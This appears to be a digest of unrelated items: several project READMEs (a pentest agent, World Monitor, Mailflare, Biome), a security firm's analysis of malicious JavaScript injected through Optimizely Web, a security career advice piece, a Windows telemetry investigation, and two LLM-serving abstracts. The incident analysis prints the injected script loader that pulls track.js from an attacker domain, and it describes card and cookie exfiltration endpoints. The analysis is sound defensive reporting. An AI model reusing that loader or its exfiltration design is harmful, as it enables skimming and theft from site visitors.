full methodology from recon to reporting CTF competitions — flag tracking, objective management, multi-target coordination Bug bounty — web app testing, API security, recon automation Vulnerability research — systematic enumeration and validation Infrastructure security — network service auditing, default-credential checks Configuration Config lives at .pentestcode/pentestcode.jsonc : { "provider" : { "anthropic" : { "model" : " claude-sonnet-4-20250514 " }
  }
} Providers: Anthropic, OpenAI, Google, Azure, AWS Bedrock, Ollama, Together, Groq, Fireworks, DeepSeek, Mistral, and more via ai-sdk . Contributing Bug reports from real usage are the most valuable thing you can send.

title: koala73/worldmonitor
abstract:
World Monitor 簡體中文 | 日本語 | Русский Real-time global intelligence dashboard — AI-powered news aggregation, geopolitical monitoring, and infrastructure tracking in a unified situational awareness interface. The World Monitor name and wordmark identify the official site at www.worldmonitor.app , so please don't present a fork as the official site. Documentation · Releases · Contributing Ways to Use It Surface Get it Docs Web app worldmonitor.app and the tech, finance, commodity, happy and energy variants Getting Started Desktop app (Tauri) Windows, macOS and Linux downloads above Desktop App Terminal dashboard npx worldmonitor Terminal Dashboard CLI npm install -g worldmonitor or brew install worldmonitor Command-Line Client SDKs Python worldmonitor-sdk , Ruby worldmonitor , Go sdk/go SDKs MCP server https://worldmonitor.app/mcp MCP Overview The terminal dashboard runs the same live data in your shell: world map, news, markets, conflict, military flights, cyber, climate, prediction markets and live TV, with mouse support and colour themes. No API key needed. title: hieunc229/mailflare
abstract:
Mailflare A self-hosted alternative to Google Workspace. Setup custom domain Emails , Calendar, Drive, Booking and built-in AI agents . Run it on Cloudflare or Docker. Send and receive with Cloudflare, Resend or Amazon SES. Store files in R2, Backblaze B2 or AWS S3. Use D1, Postgres, MySQL or Turso for the database. Screenshots Inbox Domains Mailboxes Calendar Booking Drive Sponsors Want to support Mailflare? Become a sponsor . Features Apps Email : Custom domain mailboxes, personal or shared, with access you control. Send and receive with Cloudflare Email, Resend or Amazon SES. Routing rules : Store, forward, reject or sort incoming mail. Calendar : Repeating events with time zones. Attendees get email invitations. Booking : Share a public link so anyone can book a free time on your calendar. Drive : Store and share files. AI agents : Search mail, draft replies and manage events. Connect other AI tools over MCP. Technical Databases : Cloudflare D1 (default), PostgreSQL, MySQL, Turso / libSQL, or a local SQLite file. Set DATABASE_URL to switch. Works with Supabase, Neon, PlanetScale, TiDB and more. See Databases . File storage : Cloudflare R2, Backblaze B2 or AWS S3. Hosting : Cloudflare Workers or a single Docker container. Admin : Users, API keys, webhooks, audit logs and backups. Import : Bring in mail from IMAP, Gmail Takeout, .eml and .mbox files. Mailflare currently supports 34 languages, including English, Português (Brasil), Português (Portugal), Español, Français, Deutsch, Italiano, Nederlands, Polski, Українська, Русский, Türkçe, 中文（簡體）, 日本語, 한국어, Bahasa Indonesia, Bahasa Melayu, Tiếng Việt, ไทย, हिन्दी, বাংলা, मराठी, తెలుగు, தமிழ், ગુજરાતી, ಕನ್ನಡ, മലയാളം, ਪੰਜਾਬੀ, සිංහල, Kiswahili, Hausa, plus العربية, اردو and فارسی (right-to-left). Cost You can receive and send mail for free. Receiving : Cloudflare Email Routing is free. Sending : Use the free tier of Resend (3,000 emails a month) or Amazon SES. Cloudflare's own sending needs the $5/month Paid Worker plan. New Amazon SES accounts start in a sandbox. Ask AWS for production access to lift it. Prices change, so check Resend , Amazon SES and Cloudflare . Deploy Deploy the app. Click Deploy to Cloudflare . Keep the app name mailflare , or it will break. Finish setup. Open the app at /setup and create your admin account. Connect a domain. Add a domain from the same Cloudflare account, then create your first mailbox. CF_TOKEN is required. Create a scoped Cloudflare API token with these permissions: All accounts: Email Sending:Edit, DNS Settings:Edit, Email Routing Addresses:Edit All zones: DNS Settings:Edit, Email Routing Rules:Edit, Zone Settings:Edit, DNS:Edit More options: deployment guide . Deploy with an AI agent Paste this into an AI agent that has terminal access (Claude Code, Codex, Cursor and similar): Install Mailflare for me from https://github.com/hieunc229/mailflare on my Cloudflare account.

1. Read README.md, docs/deployment.md and wrangler.jsonc first.
2. Ask me for my Cloudflare account ID and two API tokens, using a secret input:
   a deploy token (for Wrangler) and a runtime token (the Worker secret CF_TOKEN).
   Never print them, commit them, or pass them as command arguments.
3. Keep the Worker name exactly "mailflare". Create or reuse the D1 database
   "mailflare", the R2 bucket "mailflare-raw", and the queues "mailflare-inbound",
   "mailflare-outbound" and "mailflare-agent".
4. Install dependencies, run `npm run deploy`, and set CF_TOKEN as a Worker secret.
   Do not run remote database migrations yourself. The /setup page does that.
5. Give me the app URL and anything I still need to do. I will open /setup, create
   the admin account and connect my domain. Token permissions and more options: deployment guide . Self-host with Docker Runs as one container on any server, with SQLite and local files. cp .env.docker.example .env.docker
docker compose up -d --build See self-hosting . Local development cp .dev.vars.example .dev.vars
npm install
npm run db:migrate:local
npm run dev Add your Cloudflare credentials to .dev.vars , then open localhost:3000 . Run npm run db:seed to load sample data. npm run build : build the Worker npm run deploy : build and deploy npm run lint : lint and type check A schema change needs a migration for each database type. See Databases . Documentation Deployment and configuration Databases Sending and receiving providers API and integrations Email assistant and MCP Adding a language Troubleshooting License See LICENSE .

हिन्दी | English | Español | Français | 繁體中文 | 簡體中文 | 日本語 | Polski | Português do Brasil | 한국어 | Русский | Українська Biome is a performant toolchain for web projects, it aims to provide developer tools to maintain the health of said projects. Biome is a fast formatter for JavaScript , TypeScript , JSX , JSON , CSS , GraphQL , HTML , Markdown , YAML , and SCSS that scores 97% compatibility with Prettier . Biome is a performant linter for JavaScript , TypeScript , JSX , JSON , CSS , GraphQL , HTML , Markdown , YAML , and SCSS that features more than 750 rules from ESLint, typescript-eslint, and other sources .
It outputs detailed and contextualized diagnostics that help you to improve your code and become a better programmer! Biome is designed from the start to be used interactively within an editor .
It can format and lint malformed code as you are writing it. Installation npm install --save-dev --save-exact @biomejs/biome Usage # format files npx @biomejs/biome format --write # lint files and apply the safe fixes npx @biomejs/biome lint --write # run format, lint, etc. and apply the safe fixes npx @biomejs/biome check --write # check all files against format, lint, etc. in CI environments npx @biomejs/biome ci If you want to give Biome a run without installing it, use the online playground , compiled to WebAssembly. Documentation Check out our homepage to learn more about Biome,
or directly head to the Getting Started guide to start using Biome. More about Biome Biome has sane defaults and it doesn't require configuration. Biome aims to support all main languages of modern web development. Biome doesn't require Node.js to function. Biome has first-class LSP support, with a sophisticated parser that represents the source text in full fidelity and top-notch error recovery. Biome wants to offer a high-quality Developer Experience , with descriptive diagnostics and great performance. Biome unifies functionalities that have previously been separate tools. Building upon a shared base allows us to provide a cohesive experience for processing code, displaying errors, parallelize work, caching, and configuration. Read more about our project philosophy . Biome is MIT licensed or Apache 2.0 licensed and moderated under the Contributor Covenant Code of Conduct . title: Optimizely Compromised, Served Malware on Zoom, GitLab
abstract:
On 16 November 2026, malicious JavaScript was served to visitors of 178 organisations through the Optimizely Web experimentation platform. The list includes some of the most visited sites in the world: Zoom, the BBC, CNN, Salesforce, GitLab, IKEA, HSBC, Equifax, Air France-KLM, Ledger and Peacock . The malware was a multi-purpose kit. It swapped cryptocurrency wallet addresses for the attacker's, skimmed payment cards, stole cookies and screenshots, and on iPhones and iPads it delivered the Coruna and DarkSword iOS exploit kits . Crypto has already been stolen, with verified transactions to the attackers. This is exactly the kind of attack Report URI is designed to detect. Our platform can identify unexpected changes to trusted JavaScript, detect new scripts being loaded and reveal suspicious connections to external destinations. In this case, those signals would have exposed the malicious activity, even though the original script was being served from a trusted Optimizely domain. With an appropriate CSP in enforcement mode, organisations could have gone a step further and blocked key parts of the attack before they succeeded. The important lesson here is that trusted JavaScript doesn't always remain trustworthy . A website can be compromised through a third-party dependency without its own code or infrastructure ever being breached. Most of the malicious code has now been removed. At 21:52 UTC we found it in only 1 of the 188 infected snippets, down from 169 at 20:56 UTC. If your site uses Optimizely Web, or you visited any of the sites below today, read on. What happened Optimizely Web works by having each customer load a JavaScript "snippet" from Optimizely's CDN, for example https://cdn.optimizely.com/js/6395285578973184.js . The snippet contains Optimizely's code, the customer's experiments and an optional field called Project JavaScript ( projectJS ): custom code the customer writes in their Optimizely dashboard, which runs on every page. The attacker wrote their own code into the Project JavaScript of customer projects, and the rest of each snippet was untouched. The file was still served from cdn.optimizely.com , with Optimizely's certificate, from a host that every affected site already trusted. Here is what was added to Zoom's snippet: "projectJS": function(){(function(){try{var s=document.createElement('script');s.src='https://1688360.cc/track.js';s.async=true;(document.head||document.documentElement).appendChild(s);}catch(e){}})(); We saw three versions of the injected loader: A plain <script> tag pointing at https://1688360.cc/track.js (most snippets). The same URL hidden in base64 with atob() . A search for "1688360.cc" won't find it. Smartsheet's snippet was cleaned at one point and then re-infected with this version, so whoever wrote the code still had access at the time. A full inline copy of the payload , which runs through eval if 1688360.cc is blocked. Some customers serve their snippet from their own domain, such as opt.scheels.com/js/<id>.js or www.vodafone.com.au/js/<id>.js . Those were affected too, because the content comes from the same Optimizely project. We don't know how the attacker got write access to so many unrelated customer projects: a compromised Optimizely system, a compromised credential with cross-customer access, or something else. That's for Optimizely to explain. To be clear, Optimizely's CDN served exactly what it was given; this was not a CDN cache-poisoning attack. Optimizely's own sites were affected as well: the snippets for www.optimizely.com and login.optimizely.com both carried the code. Timeline (UTC) Time Event Sep 17 webshell.lol , the same actor's injector, first appears on Turkish sites through an SEO "backlink panel" script Nov 09 17:52 5vobauua3ojpklx.icu registered (iOS exploit-kit router) Nov 13 to 11-16 Earlier wave: webshell.lol/get.js injected through Kissmetrics , StorifyMe and Minute Media scripts on sites including securitybank.com, faz.net, smh.com.au, vidaxl and foxsports.com Nov 16 02:21 Last clean urlscan capture of the BBC's Optimizely snippet Nov 16 04:21 First Optimizely injection seen (BBC snippet loading webshell.lol ) 04:28 to 05:23 1688360.cc certificates issued; domain registered at 05:23 08:10 First build of track.js (crypto clipper) 08:28 1688360.cc/track.js first seen on bbc.com 11:20 Zoom's snippet modified (its Last-Modified header) 13:03 Attacker sweeps stolen crypto to exchanges 13:43 Card skimmer added to track.js 16:38 eil786npto9u5bq.icu registered (second iOS router) 17:13 to 17:57 Second iOS host added; Coruna iframe injected into every iOS 18.6-or-earlier visit 19:24 to 19:59 Our sweep: 186 of 1,611 Optimizely snippets infected ~20:40 to 21:10 Mass clean-up (Ledger 20:41, Smartsheet 20:56, BBC 21:07) 21:52 1 of 188 snippets still infected (TalkTalk) The payload was rebuilt 26 times during the day. The attacker added features, and added wallets but never removed any. What the payload does Every visitor received the same script, track.js , and every part of it was active at once. What a visitor experienced depended on their device and what they did on the page. 1. Crypto address swapping (already stealing money) The script finds any valid wallet address (BTC, ETH and EVM chains, TRON, Solana, TON, Litecoin, Bitcoin Cash, Dogecoin) and replaces it with one of the attacker's. It validates checksums so it only swaps real addresses. It swaps them in: page text, form fields, links and images; the clipboard, on copy and through navigator.clipboard ; outgoing fetch /XHR requests, window.open , navigation and the iOS share sheet. It re-scans the page whenever it changes. Copy an address from any affected page, or from anywhere else while that tab is open, and you may paste the attacker's. 2. Card skimming Added at 13:43 UTC. The script watches form submissions and every fetch /XHR POST for a card number (Luhn-checked), expiry date and CVV. When it has all three, it sends them to https://1688360.cc/card.php with navigator.sendBeacon . Cards entered in hosted payment iframes (Stripe, Adyen and similar) were out of its reach. Cards typed into a site's own form fields were not. 3. Cookie and screenshot theft When it swaps an address next to wallet or payment wording, it sends the following to https://1688360.cc/hit.php : the page URL; document.cookie (cookies not marked HttpOnly ); the original addresses it replaced; a screenshot of the page, rendered with html2canvas. 4. iOS exploit kits: Coruna and DarkSword On iPhones and iPads the script loads boot.js from 5vobauua3ojpklx.icu and eil786npto9u5bq.icu . It reads the iOS version and loads an exploit chain in a hidden iframe: iOS version Chain 13 to 17 Coruna ( /A8/ , plus a direct Coruna loader at /JIUJIU888/index.js ) 18.x DarkSword ( /B9/ , /D11/ , /D12/ ) 26 Separate chain ( /C10/ ); currently only fingerprints the device The Coruna loader is byte-identical to a sample we analysed in October from a different campaign. The kit's own comments say iOS 18.7.3 and later, and 26.3 and later, are patched. Pages on iOS 18.6 or earlier reload every 60 seconds to retry the exploit, which is a visible symptom. Money stolen so far As of 19:25 UTC on 16 November, the attacker's wallets had received about $7,040 , all within roughly nine hours on the 16th: Wallet Received ≈ USD BTC 19g9rZcPeiz8rUvyWpTRyXXhPnjsWrc3kW 0.08298 BTC (4 tx), unspent $5,380 LTC ltc1q3wp7g6ds0ggg6fl6kncpa4sepn0q3qfacgred5 17.02 LTC (3 tx) $762 TRON THvs6p56XkUiMkJeSc51cAP64u2RsTYqxa 662.9 USDT + 184 TRX $719 ETH 0xC4026b06D82b0F0B363eda0642D61CfbDc17884e 0.055 ETH $100 BSC (same 0x address) 82 USDT $82 Funds were swept out at 13:03 to 13:05 UTC. The USDC on Ethereum went to a HitBTC deposit address . The TRON wallet has been in use since March 2026 , so this actor was active long before this campaign. We cannot see how many cards or cookies reached 1688360.cc .

title: How to Break into Security, Ptacek Edition (2012)
abstract:
At least once a month, sometimes more, readers write in to ask how they can break into the field of computer security. Some of the emails are from people in jobs that have nothing to do with security, but who are fascinated enough by the field to contemplate a career change. Others are already in an information technology position but are itching to segue into security. I always respond with my own set of stock answers, but each time I do this, I can’t help but feel my advice is incomplete, or at least not terribly well-rounded. I decided to ask some of the brightest minds in the security industry today what advice they’d give. Almost everyone I asked said they, too, frequently get asked the very same question, but each had surprisingly different takes on the subject. Today is the first installment in a series of responses to this question. When the last of the advice columns have run, I’ll create an archive of them all that will be anchored somewhere prominently on the home page. That way, the next time someone asks how they can break into security, I’ll have more to offer than just my admittedly narrow perspectives on the matter. Last month, I interviewed Thomas Ptacek , founder of Matasano Security , about how companies could beef up password security in the wake of a week full of news about password leaks at LinkedIn and other online businesses. Ptacek’s provocative advice generated such a huge amount of reader interest and further discussion that I thought it made sense to begin this series with his thoughts: Ptacek: “Information security is one of the most interesting, challenging, and, if you do it carefully, rewarding fields in the technology industry. It’s one of the few technology jobs where the most fun roles are well compensated. If you grew up dreaming of developing games, the laws of supply and demand teach a harsh lesson early in your career: game development jobs are often tedious and usually pay badly. But if you watched “Sneakers” and ideated a life spent breaking or defending software, great news: infosec can be more fun in real life, and it’s fairly lucrative. I’m a software developer. I try to look at security through the lens of computer science. To me, the most attractive thing about the field is the opportunity it provides to work with lots of different concepts at lots of different levels. Computer security might be the best way to work professionally with compiler theory, or to spend time understanding computer microarchitecture, or to apply advanced mathematics. Other people get involved in security for different reasons, and those reasons are probably equally valid. Some people really like the “good guys / bad guys” narrative that comes with security. Some people see security as an opportunity to save the world. Other people are drawn to the competitive nature of the field: at the higher levels, it really is a cat-and-mouse game. It also comes closer to meritocracy than most of technology: you can either break in or you can’t; your defenses either work or they don’t. But for me, it’s just one of the best development jobs you can get, and with that in mind, here’s my advice for people interested in pursuing a career in it. First: I want you to learn how to program. Clearly, you can get through college and get a good-paying steady job without ever learning to love programming. But no one factor gives you as much control over your career, as much of an ability to write your own ticket, as the ability to solve problems using programming languages. A lot of very smart technology professionals have concluded that they just don’t enjoy writing software. Those people should reconsider. Try different languages, or different application domains, but find a way to make programming stick in your head. Second: the best jobs in our field are in application security. You can get good steady work designing firewall deployments, setting up desktop agents, or responding to incidents. But all those roles are fundamentally reacting to what’s happening in appsec. The next generation of security products — along with the org charts of security teams at the savviest companies — are being designed now, by accident, by application security practitioners. Appsec roles are roles that involve attacking software or devising fixes and countermeasures for those attacks. Two good ways to “come up” in appsec: become a penetration tester, or contribute to (or start) a secure software development practice in your company. A good way to move into penetration testing: grab some industry standard tools and use an Amazon EC2 account to set up a “shooting range” to attack. Some of the best-known tools are available for free: the Nessus scanner , for instance, while not an application security tool, is free and can land you a network penetration testing role that you can use as a springboard to breaking applications. When people reach out to Matasano asking how to get a foot in the door attacking software, we have a few simple steps to offer: 0. Learn to love programming in at least one language. The C Programming Language has the most cachet in application security, but for this step-by-step list, Java or Python or Ruby will do fine. 1. Grab a copy of The Web Application Hacker’s Handbook . 2. Go to the “previous releases” archive at WordPress.org and grab very old versions of WordPress; install them at EC2. 3. Download OWASP WebScarab or Burp Suite Free Edition , both of which are free, and use them to find bugs in ancient WordPress. If you’re already in an IT role, and want to come up on the defensive side of appsec, try to position yourself near custom software development. Most large firms build “line of business” applications. As a rule, building “line of business” isn’t particularly fun. But defending those apps can be; sometimes, the most boring applications turn out to be surprisingly sensitive. And the good news for doing appsec in BigCo’s: most companies have very immature security programs. If you can get a role in QA, or in what the cool kids are calling “DevOps”, you can end up with a lot of influence in security. At Matasano, we’ve watched lots of ops people successfully transition to appsec and senior security management just by instituting basic security testing processes on their company’s software. To me, the whole field boils down to studying, understanding, and manipulating technology. Like most software security practices, we’ve gotten our hands dirty with a fascinating cross-section of the whole technology industry. We’ve written attack tools that target the control registers of device chipsets, we’ve done custom RF work, we’ve written low-level debuggers for different CPU architectures, and we’ve seen and beaten up on products built in almost every programming language and every platform you can imagine. If crawling through the ventilation ducts of the world’s most important technology is something you think might make you tick like we do… well, appsec! Learn to code. Spend a couple days Starbucks money on an EC2 account and deploy some broken apps to break. Find opportunities to practice in your job. And, uh, come talk to us? People like you are hard to find!”

title: Windows 11 Is Collecting Data on Which Coding Agents and Developer Tools You Use
abstract:
I recently asked AI to help me look through the latest Windows binaries for undocumented features and functionality. Among the leads it turned up, one list immediately caught my attention: coding agents such as codex.exe , claude.exe , copilot.exe , and cursor.exe , alongside familiar developer tools such as python.exe , dotnet.exe , gcc.exe , and code.exe . Why would a Windows system DLL need a list of coding agents and developer tools? The names were in MissionControlAggregator.dll . I asked the agent to follow the references and dig into what the DLL actually does. That led from a handful of string comparisons to a running Windows component that records which coding agents and developer tools have been used, saves that information locally, and reports it to Windows Diagnostics. And unless you have opted out of the “optional” diagnostic data (which is enabled by default), the data is uploaded to Microsoft. I shared the initial finding on X . This post includes more details about the investigation behind it. Following the names Opening the DLL in Binary Ninja made the first lead easy to see. These were explicit executable names embedded in a Windows component: Following the references showed that the names were used in comparisons. There are four CLI-agent slots checking copilot.exe , claude.exe , codex.exe , and agy.exe , with extensionless equivalents on the WSL route. Five desktop-agent slots check github.exe , claude.exe , codex.exe , cursor.exe , and antigravity.exe . Here is one of the comparisons against codex.exe : The compiler-generated C++ names are unwieldy, so I will call these functions executable-name matchers . For reference, one related matcher is std::_Func_impl_no_alloc<<lambda_340dfe7e962ab225b6ac33bc664bd54f>, bool, std::basic_string_view<wchar_t, std::char_traits<wchar_t>> const&, Microsoft::Diagnostics::MissionControlAggregator::Utils::AppType>::_Do_call . The screenshot shows another lambda instantiation performing the same kind of name comparison. The feature guarding the new agent checks has a particularly direct name: CLICodingAgentUsage , feature ID 62580080 . And the list extends beyond AI agents. The same component checks for node.exe , python.exe , dotnet.exe , gcc.exe , clang.exe , gdb.exe , javac.exe , devenv.exe , and code.exe , among others. Those checks feed broader developer-tool categories. Some of these checks also verify the publisher: the Node.js slot expects Node.js Foundation , Python expects Python Software Foundation , and the .NET and Visual Studio slots expect Microsoft Corporation . The compiler/debugger group containing GCC and Clang has no additional publisher check in this path. Where does the DLL get this information? The next question was whether the component scans running processes itself. Following Aggregator::OnLoad revealed that it subscribes to existing Windows events instead. For Windows programs, it consumes KernelProcess.AppStateChangeSummary and Win32kTraceLogging.AppInteractivitySummary . These provide application identities that its handlers parse and pass to the matchers. For WSL, it consumes Microsoft.Windows.Lxss.Manager.Exec and ExecCritical , using the imageName field. A regular Windows codex.exe can therefore reach the CLI-agent checks through the app-state summary route; this is not limited to Linux programs running inside WSL. The relevant flow looks like this: Aggregator::OnLoad ├─ WSL Exec / ExecCritical │ └─ ProcessWslExecEvent → CLI agent matchers ├─ KernelProcess.AppStateChangeSummary │ └─ ProcessAppStateChangeSummaryEvent → CLI agent matchers └─ Win32kTraceLogging.AppInteractivitySummary └─ ProcessAppInteractivitySummaryEvent → desktop agent matchers Aggregator::OnRelativeTimerExpire └─ MissionControlAggregatorLogging::ReportCohorts<12,4,5> └─ Segments.SubCohorts ETW report Aggregator::OnUnload / intermediate timer └─ PersistentState::SaveToDisk A successful match sets a slot in the aggregator’s state. Later, ReportCohorts<12,4,5> turns those slots into bitsets and emits a report named Segments.SubCohorts . The numbers correspond to twelve broader tool categories, four CLI agents, and five desktop agents. ETW (Event Tracing for Windows) is the mechanism carrying that report. In this case, it is a self-describing TraceLogging event. Rather than writing the executable names into every report, the component assigns each category a bit. A set Codex bit means the matching tool was observed during the reporting window. The source events also include runtime, time in focus, interaction counters, and resource usage. This component appears to discard those details and record only a bitmap of which agents were observed. The report’s timestamps describe the collection window, not how long each agent was used. Although I found no prompt text or source code in this report, collecting which agents and developer tools someone uses already has significant privacy implications. Is it actually running on a normal machine? Strings and code are a useful lead, but I wanted to see the component running. I checked my Parallels Windows 11 ARM64 VM, build 26200.9974 . Its MissionControlAggregator.dll was version 10.0.26100.9818 , and CLICodingAgentUsage was already enabled as a service experiment. I had not manually enabled the feature. DiagTrack, the Connected User Experiences and Telemetry service, was also already running with its startup type set to Automatic . It starts a separate AggregatorHost.exe process, and that process loads the DLL. The following administrative PowerShell commands show the service, its child process, and the loaded module: PS> Get-Service DiagTrack | Format-Table Name,Status,StartType -AutoSize Name Status StartType ---- ------ --------- DiagTrack Running Automatic PS> Get-Process AggregatorHost | Format-Table ProcessName,Id -AutoSize ProcessName Id ----------- -- AggregatorHost 1500 PS> Get-CimInstance Win32_Service -Filter "Name='DiagTrack'" | Format-List Name,State,StartMode,ProcessId Name : DiagTrack State : Running StartMode : Auto ProcessId : 10148 PS> Get-CimInstance Win32_Process -Filter "Name='AggregatorHost.exe'" | Format-List ProcessId,ParentProcessId ProcessId : 1500 ParentProcessId : 10148 PS> tasklist /m MissionControlAggregator.dll Image Name PID Modules ========================= ======== ============================================ AggregatorHost.exe 1500 MissionControlAggregator.dll The process IDs connect the pieces: DiagTrack runs in process 10148 , which is the parent of AggregatorHost.exe , process 1500 ; the module listing places MissionControlAggregator.dll inside that child. The public ISO’s baseline VM had the coding-agent feature disabled by image default, so the evidence does not support saying that it is active on every Windows installation. On my ARM64 VM, however, the relevant feature and service were active before the test. Testing it in practice To test the finding in practice, I copied cmd.exe to a file named codex.exe and ran it in the interactive Windows session. The name alone was enough for the component to recognize it as Codex. I captured an AppStateChangeSummary for the running process from the KernelProcess provider ( {2839ff94-8f12-4e1b-82e3-af7af77a450f} ), with LaunchCount=1 and TerminateCount=0 . The aggregator’s saved state contained the value 2 in CLI slot 2, the Codex slot. A separate run without an additional ETW trace also set that slot, confirming that detection worked through Windows’ existing diagnostic collection. That state is persisted in: C:\ProgramData\Microsoft\Diagnosis\AggregatorStorage\MissionControlAggregator$ The report normally follows a roughly daily boundary. To capture it immediately, I temporarily moved the saved reporting-window start 25 hours into the past and restarted DiagTrack with a trace listening for the aggregator. The resulting Segments.SubCohorts event contained: Provider: Microsoft.Windows.MissionControlAggregator Time: 2026-11-16T12:34:29.125116Z Version: 0.1.

title: Cadence: Taming Coupled Contention in Disaggregated Agent Clouds
abstract: Cadence targets multi-tenant LLM serving over operator-declared phases on disaggregated GPU pools and remote KV/cache tiers. We assume a small phase taxonomy—retrieval, tool fan-out, structured parsing, and decode—and adapt resource parameters within each phase online, rather than discovering arbitrary new behaviors at runtime. Despite strong single-tenant optimizations, clusters miss tail-latency SLOs once multi-phase requests collide with co-tenant bursts across GPU, cache, and network. The core challenge is coupled contention: a scheduler that only balances GPU utilization can still create cache hot spots and cross-rack fan-out, while transport-only fixes cannot prevent cache thrash or admission overload. Cadence jointly allocates GPU compute, KV/cache residency, and network bandwidth for phase-structured requests under per-tenant SLO and fairness constraints. It combines phase-aware resource contracts, an online co-scheduler for placement/cache/bandwidth bundles, and guardrails that combine admission control with cache and network enforcement. Across a 32-GPU, 400 Gbps leaf–spine testbed running four templates with eight tenants, at 90% offered load Cadence reduces P99 latency by 1.4–1.8 × vs GPU-Only and cuts SLO violations by 6.0–7.6 × vs GPU-Only (5.1–7.1 × vs Cache-Only/Net-Only); at the GPU-Only saturation point (100% normalized offered load), it improves cluster goodput by up to 54%. Cadence remains stable under 50% tenant churn and 40% retrieval skew, maintains Jain’s fairness index ≥ 0.84 at full load, and incurs 2.25% total CPU overhead in the control plane. The supplemental artifact includes the code, configurations, and scripts needed to reproduce the figures and tables.

title: On Evaluating Performance of LLM Inference Systems
abstract: The rapid evolution of Large Language Model (LLM) inference systems has led to significant improvements in serving efficiency. However, our systematic analysis reveals that current evaluation methodologies suffer from fundamental flaws that mask critical performance issues and impede scientific progress. Through a comprehensive examination of recent systems, we identify recurring pitfalls in evaluation practices across three key dimensions: Baseline Fairness, Evaluation Setup, and Metric Design. These pitfalls are uniquely problematic for LLM inference due to its dual-phase nature combining prefill and decode operations, heterogeneous workloads, and strict temporal requirements. We demonstrate how implementation differences frequently obscure algorithmic contributions, how workload selection often fails to represent production scenarios, and how metric normalization can hide substantial performance variability that directly impacts user experience. Traditional metrics derived from the classical machine learning serving setup fail to capture the autoregressive generation characteristics essential to LLM inference, leading to misleading conclusions about system performance. To address these challenges, we provide a comprehensive checklist of best practices and methodological recommendations for robust LLM inference evaluations. To demonstrate the practical application of our methodology, we present a case study of speculative decoding evaluation - a technique whose non-uniform token generation patterns with bursts during accepted predictions and delays during verification failures fundamentally confound conventional metrics. Our work establishes a rigorous foundation for evaluation methodology that can accelerate progress in LLM inference systems by ensuring meaningful comparisons, reproducible results, and metrics that reflect real-world requirements.
